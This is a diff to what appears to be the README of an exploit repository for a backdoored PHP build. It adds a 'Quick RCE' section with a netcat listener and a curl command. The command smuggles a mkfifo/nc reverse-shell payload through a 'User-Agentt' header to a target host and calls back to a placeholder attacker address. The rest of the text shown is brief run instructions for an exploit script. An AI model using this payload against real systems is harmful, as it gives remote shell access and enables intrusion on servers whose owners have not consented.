@@ -18,3 +18,11 @@ header in Burp Suite or just run the script with the host IP, your own IP + port
 `$ chmod +x exploit.sh`
 
 `$ bash exploit.sh`
+
+## Quick RCE
+
+The quickest way to get a reverse shell, is to use a cURL request. replace `YOUR_IP` with your attacker IP address and start a netcat listener at port `4444`.
+
+`nc -nvlp 4444`
+
+`curl http://10.10.10.242/ -H "User-Agentt: zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f ');"`
